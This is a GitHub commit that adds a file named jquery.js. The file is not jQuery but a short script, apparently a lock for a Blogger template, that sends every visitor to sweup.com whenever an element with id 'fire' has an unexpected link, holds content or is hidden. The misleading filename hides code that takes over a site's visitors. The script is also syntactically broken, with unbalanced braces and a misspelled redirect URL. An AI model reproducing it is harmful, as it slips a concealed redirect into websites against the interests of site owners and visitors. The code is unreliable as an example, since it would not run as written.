ad0debedb792c61ab4eb3c2c266cb6be65c89a8d
souhailcoder <34027030+souhailcoder@users.noreply.github.com>
2017-11-30 09:34:09 +0000

    Add files via upload

---
+++ jquery.js
@@ -0,0 +1,20 @@
+{
+   
+
+if($("#fire").attr("href")!="https://slah-template.blogspot.com/" )
+if($("#fire").attr("href")!="https://tesgfhbg.blogspot.com/" )
+if($("#fire").attr("href")!="http://www.sweuddp.com" )
+
+ {
+   window.location.href="http://www.swçeup.com";
+ }
+  if($("#fire").html()!= ''){
+   window.location.href="http://www.sweup.com";
+
+  }
+if($("#fire").css('display')== 'none'){
+   window.location.href="http://www.sweup.com";
+
+  }
+
+    });
